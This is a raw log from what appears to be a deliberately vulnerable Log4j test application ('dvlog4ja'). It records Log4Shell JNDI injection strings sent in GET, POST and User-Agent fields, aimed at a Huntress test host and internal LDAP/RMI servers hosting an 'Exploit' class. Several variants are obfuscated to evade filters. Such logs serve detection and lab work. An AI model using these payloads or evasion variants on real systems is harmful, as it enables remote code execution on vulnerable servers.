2021-12-14 17:43:32.512 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
2021-12-14 17:43:51.670 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-14 17:44:00.218 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 123
2021-12-14 18:02:23.304 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
2021-12-14 19:06:11.772 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 123
2021-12-14 19:09:50.235 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c304bd68-79fa-413e-9677-be0f6212f168}


2021-12-14 19:18:14.243 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 19:20:19.815 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 19:22:49.988 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-14 19:25:48.882 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-14 19:27:58.354 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 19:28:12.378 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 19:29:21.785 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=%24%7Bjndi%3Aldap%3A%2F%2Flog4shell.huntress.com%3A1389%2F214dbdf8-99be-4a7c-a975-6670a11be417%7D
2021-12-14 19:29:44.208 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=%24%7Bjndi%3Aldap%3A%2F%2Flog4shell.huntress.com%3A1389%2F214dbdf8-99be-4a7c-a975-6670a11be417%7D
2021-12-14 19:30:06.981 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=%24%7Bjndi%3Aldap%3A%2F%2Flog4shell.huntress.com%3A1389%2F214dbdf8-99be-4a7c-a975-6670a11be417%7D
2021-12-14 19:31:26.924 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=%24%7Bjndi%3Aldap%3A%2F%2Flog4shell.huntress.com%3A1389%2F214dbdf8-99be-4a7c-a975-6670a11be417%7D
2021-12-14 19:31:45.201 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 19:32:01.461 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c304bd68-79fa-413e-9677-be0f6212f168}


2021-12-14 21:41:10.667 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:44:54.266 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:45:56.158 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:46:09.565 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:47:08.523 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:59:37.410 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c34dda44-c9d2-4222-a797-c2a073a3bef6}
2021-12-14 21:59:48.333 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c34dda44-c9d2-4222-a797-c2a073a3bef6}
2021-12-14 21:58:01.540 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/214dbdf8-99be-4a7c-a975-6670a11be417}
2021-12-14 21:51:00.072 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:57:01.288 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 21:53:11.380 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 21:51:33.938 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: Reference Class Name: Exploit

2021-12-14 22:01:45.967 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 22:02:08.641 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 22:06:35.690 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=${jndi:ldap://127.0.0.1:1387/LinuxExploit}
2021-12-14 22:17:30.140 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://127.0.0.1:1387/Exploit}
2021-12-14 22:19:07.191 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://127.0.0.1:1387/Exploit}
2021-12-14 22:17:24.799 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://127.0.0.1:1387/Exploit}
2021-12-14 22:08:06.216 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=Reference Class Name: Exploit

2021-12-14 22:09:00.829 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=Reference Class Name: Exploit

2021-12-14 23:19:23.947 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:26:02.099 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-14 23:26:05.959 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 123
2021-12-14 23:26:42.292 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:28:26.442 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:30:23.119 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:30:39.854 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:32:18.781 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:32:34.165 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:32:59.653 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:33:19.961 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:39:40.525 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:45:11.542 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:45:58.385 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:53:34.661 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://127.0.0.1:1387/Exploit}
2021-12-14 23:54:07.078 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-14 23:59:25.798 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 02:01:08.918 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://127.0.0.1:1387/Exploit}
2021-12-15 02:01:14.976 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 123
2021-12-15 02:52:50.654 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: abc
2021-12-15 02:53:10.338 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 02:58:42.623 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:00:22.284 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:00:40.494 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:05:30.519 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:05:41.722 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:05:53.267 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:49:53.799 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:50:01.256 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:53:54.354 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 453
2021-12-15 03:53:57.992 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:54:13.636 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 03:58:59.173 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: foo

2021-12-15 03:59:40.502 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:rmi://10.0.0.5:1099/5ckvsf}
2021-12-15 04:00:49.250 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 04:02:08.421 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 04:02:50.280 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: Reference Class Name: Exploit

2021-12-15 04:18:36.444 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://10.0.0.5:1387/Exploit}
2021-12-15 15:46:43.931 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-15 16:17:45.140 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-15 16:51:12.844 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-15 23:39:44.608 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: $exploit
2021-12-15 23:40:05.070 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-15 23:43:43.181 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${lower:j}ndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 00:54:10.669 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://10.0.0.6:1387/Exploit}
2021-12-16 00:54:57.079 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${lower:j}ndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 00:58:37.049 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${%2524%257Bjndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 00:59:35.351 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: %2524%257Bjndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:01:03.940 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: %2524%257Bldap://10.0.0.6:1387/Exploit}
2021-12-16 01:01:17.359 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:01:44.455 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${env:BARFOO:-j}ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:02:08.722 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${env:BARFOO:-j}ndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:07:25.356 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${${lower:j}ndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:08:04.787 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:16:40.400 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-16 01:20:51.842 [http-nio-8080-exec-3] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:22:52.398 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 01:59:31.273 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-16 01:59:31.273 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-16 02:00:13.589 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 02:49:46.478 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 15:32:09.788 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-16 15:37:48.300 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - GET: null
2021-12-16 15:37:53.869 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - GET: 123
2021-12-16 15:38:06.196 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 15:38:11.927 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 15:38:22.616 [http-nio-8080-exec-2] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 15:51:13.735 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 15:55:10.103 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 15:56:52.806 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: JHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGwuaHVudHJlc3MuY29tOjEzODkvMTAyZjhhZWItMzRlYS00YThlLWI1MmUtODljZWUxYzRiZWU5fQ==
2021-12-16 15:58:41.238 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: JHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGwuaHVudHJlc3MuY29tOjEzODkvMTAyZjhhZWItMzRlYS00YThlLWI1MmUtODljZWUxYzRiZWU5fQ==
2021-12-16 15:59:02.689 [http-nio-8080-exec-4] INFO  com.snapattack.dvlog4ja.RestAPI - GET: JHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGwuaHVudHJlc3MuY29tOjEzODkvMTAyZjhhZWItMzRlYS00YThlLWI1MmUtODljZWUxYzRiZWU5fQ==
2021-12-16 16:01:07.495 [http-nio-8080-exec-7] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/102f8aeb-34ea-4a8e-b52e-89cee1c4bee9}
2021-12-16 16:06:02.961 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 16:08:31.657 [http-nio-8080-exec-10] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c686dc02-4085-4bee-99a4-9d31cbda1450}
2021-12-16 16:16:43.580 [http-nio-8080-exec-5] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/c686dc02-4085-4bee-99a4-9d31cbda1450}
2021-12-16 16:17:51.017 [http-nio-8080-exec-8] INFO  com.snapattack.dvlog4ja.RestAPI - User Agent: ${jndi:ldap://10.0.0.6:1387/Exploit}
2021-12-16 16:20:05.324 [http-nio-8080-exec-9] INFO  com.snapattack.dvlog4ja.RestAPI - POST: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://10.0.0.6:1387/Exploit}
2021-12-16 22:20:10.705 [http-nio-8080-exec-1] INFO  com.snapattack.dvlog4ja.RestAPI - GET: string
2021-12-16 22:20:57.041 [http-nio-8080-exec-6] INFO  com.snapattack.dvlog4ja.RestAPI - GET: ${jndi:ldap://log4shell.huntress.com:1389/102350bc-0363-497a-ae4b-57d827f61347}


